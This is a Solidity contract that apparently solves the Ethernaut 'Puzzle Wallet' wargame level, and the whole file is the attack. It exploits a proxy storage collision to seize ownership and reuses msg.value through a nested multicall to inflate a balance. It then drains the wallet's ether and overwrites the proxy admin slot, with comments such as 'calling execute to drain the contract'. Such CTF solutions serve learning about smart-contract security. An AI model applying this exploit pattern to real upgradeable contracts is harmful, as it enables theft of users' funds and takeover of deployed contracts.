// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./PuzzleWallet.sol";

contract HackPuzzleWallet {

    PuzzleWallet wallet = PuzzleWallet(address(0xEB84EFafDc1C59b4dB733B2bAE5B321B5003dD3B));
    PuzzleProxy px = PuzzleProxy(payable(0xaCB258afa213Db8E0007459f5d3851c112d2fA8d));

    function run() external{
        // vm.startBroadcast();

        //creating encoded function data to pass into multicall
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);

        // making ourselves owner of wallet
        px.proposeNewAdmin(msg.sender);
        //whitelisting our address
        wallet.addToWhitelist(msg.sender);
        //calling multicall with nested data stored above
        wallet.multicall{value: 0.001 ether}(nestedMulticall);
        //calling execute to drain the contract
        wallet.execute(msg.sender, 0.002 ether, "");

        //calling setMaxBalance with our address to become the admin of proxy
        // -----> Notice here, make sure how the byte20 address locate at left side or right side of the uint256
        // wallet.setMaxBalance(uint256(uint160(msg.sender)));
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
        
        //making sure our exploit worked
        // console.log("New Admin is : ", px.admin());

        // vm.stopBroadcast();
    }
}